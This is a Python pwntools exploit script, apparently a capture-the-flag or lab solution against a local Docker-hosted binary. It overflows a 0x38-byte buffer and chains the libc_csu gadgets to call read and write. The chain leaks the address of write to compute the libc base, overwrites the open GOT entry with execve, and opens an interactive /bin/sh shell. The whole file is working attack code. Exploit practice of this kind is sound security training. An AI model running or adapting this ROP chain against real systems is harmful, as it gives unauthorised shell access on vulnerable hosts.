#!/usr/bin/python3
from pwn import *

ROOT = os.path.abspath(os.path.dirname(__file__))
target_path = os.path.abspath(os.path.join(ROOT, "../docker/target"))
e = ELF(target_path)
target_rop = ROP(e)
l = e.libc

if "REMOTE" in os.environ:
  if not "PORT" in os.environ:
      print("Need to specify the port number")
      exit(1)
  p = remote("localhost", int(os.environ["PORT"]))
else:
  p = process(e.path)

gadget = target_rop.find_gadget(['pop rbp','pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret']).address
gadget1= gadget - 1
gadget2= gadget1 - 0x1a

payload = b""

#BUF + SFP
payload += b"A" * 0x38

#read(0, e.bss(), len("/bin/sh"))
payload += p64(gadget1)
payload += p64(0)
payload += p64(1)
payload += p64(e.got["read"])
payload += p64(0)
payload += p64(e.bss())
payload += p64(len("/bin/sh\x00"))
payload += p64(gadget2)
payload += p64(0) * 7

#write(1, write@got, 8) //write leak
payload += p64(gadget1)
payload += p64(0)
payload += p64(1)
payload += p64(e.got["write"])
payload += p64(1)
payload += p64(e.got["write"])
payload += p64(8)
payload += p64(gadget2)
payload += p64(0) * 7

#write(1, e.bss(), 8) //
payload += p64(gadget1)
payload += p64(0)
payload += p64(1)
payload += p64(e.got["write"])
payload += p64(1)
payload += p64(e.bss())
payload += p64(8)
payload += p64(gadget2)
payload += p64(0) * 7

#read(0, open@got, 8) //got overwrite
payload += p64(gadget1)
payload += p64(0)
payload += p64(1)
payload += p64(e.got["read"])
payload += p64(0)
payload += p64(e.got["open"])
payload += p64(8)
payload += p64(gadget2)
payload += p64(0) * 7

#open -> execve(/bin/sh, 0, 0) //got overwrite
payload += p64(gadget1)
payload += p64(0)
payload += p64(1)
payload += p64(e.got["open"])
payload += p64(e.bss())
payload += p64(0)
payload += p64(0)
payload += p64(gadget2)
payload += p64(0) * 7
payload += b"A"*(0x500 - len(payload))

p.recvuntil(":\n")
p.send(payload)
p.send(payload)
p.send(payload)
print(p.recvuntil(b"round end ...)\n"))

p.send(b"/bin/sh\x00")

libc_write = u64(p.recv(8))
libc_start = libc_write - l.symbols["write"]
libc_execve = libc_start + l.symbols["execve"]

print("libc_base : " + hex(libc_start))
print("libc_write : " + hex(libc_write))
print("libc_execve : " + hex(libc_execve))

print(p.recv(8))
p.send(p64(libc_execve))

p.interactive()